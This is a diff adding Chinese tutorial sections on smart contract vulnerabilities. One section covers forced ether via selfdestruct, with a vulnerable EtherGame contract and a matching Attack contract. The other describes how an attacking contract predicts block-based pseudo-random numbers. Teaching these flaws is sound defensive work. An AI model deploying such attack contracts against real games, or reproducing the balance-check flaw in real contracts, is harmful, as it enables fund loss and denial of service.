@@ -102,6 +102,60 @@ contract Roulette {
     }
 }
 ```
+**合约余额依赖**
+selfdestruct函数是内置的强制执行的函数，因此即使合约没有可接受以太币的方法，
+其他人依然可以通过强制执行selfdestruct函数改变合约余额，所以要仔细检查是否将合约余额作为判断标准。
+例如，下面的合约，规定只有恰好7 ether的才能胜出，但是攻击者可以通过selfdestruct函数让没有人能够达到 7 ether.
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+contract EtherGame {
+    uint public targetAmount = 7 ether;
+    address public winner;
+
+    function deposit() public payable {
+        require(msg.value == 1 ether, "You can only send 1 Ether");
+
+        uint balance = address(this).balance;
+        require(balance <= targetAmount, "Game is over");//只有合约余额达到 7 ether 才能成功
+
+        if (balance == targetAmount) {
+            winner = msg.sender;
+        }
+    }
+
+    function claimReward() public {
+        require(msg.sender == winner, "Not winner");
+
+        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "Failed to send Ether");
+    }
+}
+
+contract Attack {
+    EtherGame etherGame;
+
+    constructor(EtherGame _etherGame) {
+        etherGame = EtherGame(_etherGame);
+    }
+
+    function attack() public payable {
+        address payable addr = payable(address(etherGame));
+        selfdestruct(addr);
+    }
+}
+
+```
+**悬赏白帽子处理黑客潜规则**
+**随机数攻击**
+针对智能合约生成算法进行攻击，预测生成结果。目前区块链上很多合约都是采用的链上信息，
+如区块时间戳，未来区块哈希等。作为游戏合约的随机数源，也称种子。使用这种种子生成的随机数
+被称为伪随机数。它不是真的随机数，存在被预测的可能。当使用可被预测的种子生成随机数的时候，
+一旦生成算法被攻击者猜到或通过逆向方式拿到攻击者就可以实现预测。
+由于区块链上的数据对所有人都公开透明，完全可以提前拿到数据，并计算结果。做法就是，创建一个攻击合约
+attack，这个合约中先预测结果，再决定是否调用其它函数。由于两个合约再同一个区块中被运行，也就是说它们拿到的
+区块难度值和时间戳相同，所以攻击者有能力先预测结果在调用。         
 
 
 
